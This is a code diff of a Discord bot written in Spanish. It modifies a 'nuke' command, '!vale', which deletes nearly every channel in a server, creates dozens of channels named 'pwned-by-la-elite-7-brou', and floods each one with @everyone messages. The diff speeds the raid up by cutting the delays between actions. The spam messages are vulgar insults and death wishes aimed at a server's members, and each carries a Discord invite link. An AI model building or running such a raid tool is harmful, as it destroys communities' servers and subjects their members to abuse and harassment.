@@ -35,135 +35,165 @@ client.on('messageCreate', async (message) => {
   }
 
   if (command === 'vale') {
-    if (!OWNER_IDS.includes(message.author.id)) {
-      return message.reply('No tienes permiso para este comando tan heavy.');
-    }
-
-    // ────────────────────────────────────────────────
-    //     === PERSONALIZA AQUÍ TODO LO QUE QUIERAS ===
-    // ────────────────────────────────────────────────
-
-    // NOMBRES DE CANALES (agrega o cambia líneas aquí)
-    const nombresDeCanales = [
-      "raid-fou-you-fuck-you",
-      "raid-fou-you-fuck-you",
-      "raid-fou-you-fuck-you",
-      "raid-fou-you-fuck-you",
-      "raid-fou-you-fuck-you",
-      "raid-fou-you-fuck-you",
-      "raid-fou-you-fuck-you",
-      "raid-fou-you-fuck-you",
-      "raid-fou-you-fuck-you",
-      "raid-fou-you-fuck-you",
-      "raid-fou-you-fuck-you",
-      "raid-fou-you-fuck-you",
-      "raid-fou-you-fuck-you",
-      "raid-fou-you-fuck-you",
-      "raid-fou-you-fuck-you",
-      "raid-fou-you-fuck-you",
-      "raid-fou-you-fuck-you",
-      "raid-fou-you-fuck-you",
-      "raid-fou-you-fuck-you",
-      "raid-fou-you-fuck-you",
-      "raid-fou-you-fuck-you",
-      // Agrega más líneas para más canales
-    ];
-
-    // MENSAJES QUE SE ENVIARÁN EN CADA CANAL (agrega o cambia aquí)
-    const mensajesEnRafaga = [
-      "@everyone domado sale en las noticias chupando pene",
-      "@everyone DOMADO POR la elite 7 subnormal",
-      "@everyone JAJAJAJAJA PUTO PERRO",
-      "@everyone ojalas te mueras hijueputa",
-      "@everyone puto mal parido hijueputa",
-      "@everyone Ya te hicieron raid a tu mierda de server",
-      "@everyone pendejo subnormal hijueputa",
-      "@everyone Tu server asqueroso JAJAJAJa",
-      // Agrega más mensajes si quieres más spam por canal
-    ];
-
-    const delayEntreMensajes = 1500; // milisegundos entre mensajes (1.5s) - sube si te da rate limit
-
-    // ────────────────────────────────────────────────
-    //        NO CAMBIES DE AQUÍ PARA ABAJO
-    // ────────────────────────────────────────────────
-
-    try {
-      await message.reply(
-        `**¡NUKE PERSONALIZADO INICIANDO EN 5 SEGUNDOS!**\n\n` +
-        `→ Creando **${nombresDeCanales.length}** canales\n` +
-        `→ Enviando **${mensajesEnRafaga.length}** mensajes en CADA canal\n\n` +
-        `¡No lo uses en servidores ajenos o te banean el bot!`
-      );
-
-      await new Promise(r => setTimeout(r, 5000));
-
-      const guild = message.guild;
-
-      // 1. Borrar canales (excepto el actual)
-      let borrados = 0;
-      for (const ch of guild.channels.cache.values()) {
-        if (ch.deletable && ch.id !== message.channel.id) {
-          try {
-            await ch.delete('Nuke by Patricio');
-            borrados++;
-            await new Promise(r => setTimeout(r, 400));
-          } catch {}
-        }
-      }
-      await message.channel.send(`→ Borrados **${borrados}** canales.`);
-
-      // 2. Crear canales personalizados
-      const nuevosCanales = [];
-      for (const nombreOriginal of nombresDeCanales) {
-        try {
-          let nombre = nombreOriginal
-            .toLowerCase()
-            .replace(/[^a-z0-9- ]/g, '-')
-            .replace(/\s+/g, '-')
-            .replace(/-+/g, '-')
-            .replace(/^-|-$/g, '')
-            .slice(0, 100) || 'raid-default';
-
-          const canal = await guild.channels.create({
-            name: nombre,
-            type: ChannelType.GuildText,
-            permissionOverwrites: [
-              { id: guild.id, allow: ['ViewChannel', 'SendMessages', 'MentionEveryone'] }
-            ]
-          });
-
-          nuevosCanales.push(canal);
-          console.log(`Creado → #${canal.name}`);
-          await new Promise(r => setTimeout(r, 100)); // 1s entre creaciones para evitar rate limit
-        } catch (err) {
-          console.log(`Fallo creando "${nombreOriginal}": ${err.message}`);
-        }
-      }
-      await message.channel.send(`→ Creados **${nuevosCanales.length}** canales.`);
-
-      // 3. Enviar mensajes personalizados en cada canal
-      let spameados = 0;
-      for (const canal of nuevosCanales) {
-        try {
-          for (const msg of mensajesEnRafaga) {
-            await canal.send(msg);
-            console.log(`Enviado a #${canal.name}`);
-            await new Promise(r => setTimeout(r, delayEntreMensajes));
-          }
-          spameados++;
-        } catch (err) {
-          console.log(`Problema en #${canal.name}: ${err.message}`);
-        }
-      }
-
-      await message.channel.send(`**¡TERMINADO!** 😈\nCanales spameados: **${spameados}**`);
-
-    } catch (err) {
-      console.error('Error en !vale:', err.message || err);
-      await message.channel.send(`**Error grave:** ${err.message || 'Revisa logs'}`).catch(() => {});
-    }
+  if (!OWNER_IDS.includes(message.author.id)) {
+    return message.reply('No tienes permiso para este comando tan heavy.');
   }
+
+  // ────────────────────────────────────────────────
+  //     PERSONALIZA CANALES Y MENSAJES AQUÍ
+  // ────────────────────────────────────────────────
+
+  const nombresDeCanales = [
+    "pwned-by-la-elite-7-brou",
+    "pwned-by-la-elite-7-brou",
+    "pwned-by-la-elite-7-brou",
+    "pwned-by-la-elite-7-brou",
+    "pwned-by-la-elite-7-brou",
+    "pwned-by-la-elite-7-brou",
+    "pwned-by-la-elite-7-brou",
+     "pwned-by-la-elite-7-brou",
+    "pwned-by-la-elite-7-brou",
+    "pwned-by-la-elite-7-brou",
+    "pwned-by-la-elite-7-brou",
+    "pwned-by-la-elite-7-brou",
+    "pwned-by-la-elite-7-brou",
+    "pwned-by-la-elite-7-brou",
+    "pwned-by-la-elite-7-brou",
+    "pwned-by-la-elite-7-brou",
+    "pwned-by-la-elite-7-brou",
+    "pwned-by-la-elite-7-brou",
+    "pwned-by-la-elite-7-brou",
+    "pwned-by-la-elite-7-brou",
+    "pwned-by-la-elite-7-brou",
+    "pwned-by-la-elite-7-brou",
+    "pwned-by-la-elite-7-brou",
+    "pwned-by-la-elite-7-brou",
+    "pwned-by-la-elite-7-brou",
+    "pwned-by-la-elite-7-brou",
+    "pwned-by-la-elite-7-brou",
+    "pwned-by-la-elite-7-brou",
+    // Agrega o quita nombres aquí
+  ];
+
+  const mensajesEnRafaga = [
+    "@everyone domado sale en las noticias chupando pene https://discord.gg/ZZBf67J7",
+    "@everyone DOMADO POR la elite 7 subnormal https://discord.gg/ZZBf67J7",
+    "@everyone JAJAJAJAJA PUTO PERRO https://discord.gg/ZZBf67J7",
+    "@everyone ojalas te mueras hijueputa https://discord.gg/ZZBf67J7",
+    "@everyone puto mal parido hijueputa https://discord.gg/ZZBf67J7",
+    "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/ZZBf67J7",
+    "@everyone pendejo subnormal hijueputa https://discord.gg/ZZBf67J7",
+    "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/ZZBf67J7",
+    "@everyone JAJAJAJAJA PUTO PERRO https://discord.gg/ZZBf67J7",
+    "@everyone ojalas te mueras hijueputa https://discord.gg/ZZBf67J7",
+    "@everyone puto mal parido hijueputa https://discord.gg/ZZBf67J7",
+    "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/ZZBf67J7",
+    "@everyone pendejo subnormal hijueputa https://discord.gg/ZZBf67J7",
+    "@everyone domado sale en las noticias chupando pene https://discord.gg/ZZBf67J7",
+    "@everyone DOMADO POR la elite 7 subnormal https://discord.gg/ZZBf67J7",
+    "@everyone JAJAJAJAJA PUTO PERRO https://discord.gg/ZZBf67J7",
+    "@everyone ojalas te mueras hijueputa https://discord.gg/ZZBf67J7",
+    "@everyone puto mal parido hijueputa https://discord.gg/ZZBf67J7",
+    "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/ZZBf67J7",
+    "@everyone pendejo subnormal hijueputa https://discord.gg/ZZBf67J7",
+    "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/ZZBf67J7",
+        "@everyone domado sale en las noticias chupando pene https://discord.gg/ZZBf67J7",
+    "@everyone DOMADO POR la elite 7 subnormal https://discord.gg/ZZBf67J7",
+    "@everyone JAJAJAJAJA PUTO PERRO https://discord.gg/ZZBf67J7",
+    "@everyone ojalas te mueras hijueputa https://discord.gg/ZZBf67J7",
+    "@everyone puto mal parido hijueputa https://discord.gg/ZZBf67J7",
+    "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/ZZBf67J7",
+    "@everyone pendejo subnormal hijueputa https://discord.gg/ZZBf67J7",
+    "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/ZZBf67J7",
+    "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/ZZBf67J7"
+    // Agrega o quita mensajes aquí
+  ];
+
+  const delayCreacionCanales = 300;   // 0.3 segundos entre creación (más rápido)
+  const delayEntreMensajes = 400;     // 0.4 segundos entre mensajes (más rápido)
+
+  // ────────────────────────────────────────────────
+  //        NO CAMBIES DE AQUÍ PARA ABAJO
+  // ────────────────────────────────────────────────
+
+  try {
+    await message.reply(
+      `**¡NUKE RÁPIDO INICIANDO EN 5,00 SEGUNDOS!**\n\n` +
+      `→ Creando **${nombresDeCanales.length}** canales\n` +
+      `→ Enviando **${mensajesEnRafaga.length}** mensajes en CADA canal\n\n` +
+      `¡Va a ir más rápido ahora!`
+    );
+
+    await new Promise(r => setTimeout(r, 500));
+
+    const guild = message.guild;
+
+    // 1. Borrar canales (rápido)
+    let borrados = 0;
+    for (const ch of guild.channels.cache.values()) {
+      if (ch.deletable && ch.id !== message.channel.id) {
+        try {
+          await ch.delete('Nuke rápido by Patricio');
+          borrados++;
+          await new Promise(r => setTimeout(r, 200)); // delay mínimo
+        } catch {}
+      }
+    }
+    await message.channel.send(`→ Borrados **${borrados}** canales.`);
+
+    // 2. Crear canales (más rápido)
+    const nuevosCanales = [];
+    for (const nombreOriginal of nombresDeCanales) {
+      try {
+        let nombre = nombreOriginal
+          .toLowerCase()
+          .replace(/[^a-z0-9- ]/g, '-')
+          .replace(/\s+/g, '-')
+          .replace(/-+/g, '-')
+          .replace(/^-|-$/g, '')
+          .slice(0, 100) || 'raid-default';
+
+        const canal = await guild.channels.create({
+          name: nombre,
+          type: ChannelType.GuildText,
+          permissionOverwrites: [
+            { id: guild.id, allow: ['ViewChannel', 'SendMessages', 'MentionEveryone'] }
+          ]
+        });
+
+        nuevosCanales.push(canal);
+        console.log(`Creado → #${canal.name}`);
+        await new Promise(r => setTimeout(r, delayCreacionCanales));
+      } catch (err) {
+        console.log(`Fallo creando "${nombreOriginal}": ${err.message}`);
+        await new Promise(r => setTimeout(r, 2000)); // espera más si falla (rate limit)
+      }
+    }
+    await message.channel.send(`→ Creados **${nuevosCanales.length}** canales.`);
+
+    // 3. Spam rápido en cada canal
+    let spameados = 0;
+    for (const canal of nuevosCanales) {
+      try {
+        for (const msg of mensajesEnRafaga) {
+          await canal.send(msg);
+          console.log(`Enviado a #${canal.name}`);
+          await new Promise(r => setTimeout(r, delayEntreMensajes));
+        }
+        spameados++;
+      } catch (err) {
+        console.log(`Problema en #${canal.name}: ${err.message}`);
+        await new Promise(r => setTimeout(r, 3000)); // espera si rate limit
+      }
+    }
+
+    await message.channel.send(`**¡TERMINADO RÁPIDO!** 😈\nCanales spameados: **${spameados}**`);
+
+  } catch (err) {
+    console.error('Error en !vale:', err.message || err);
+    await message.channel.send(`**Error grave:** ${err.message || 'Revisa logs'}`).catch(() => {});
+  }
+}
 });
 
 client.login(process.env.TOKEN).catch(err => {
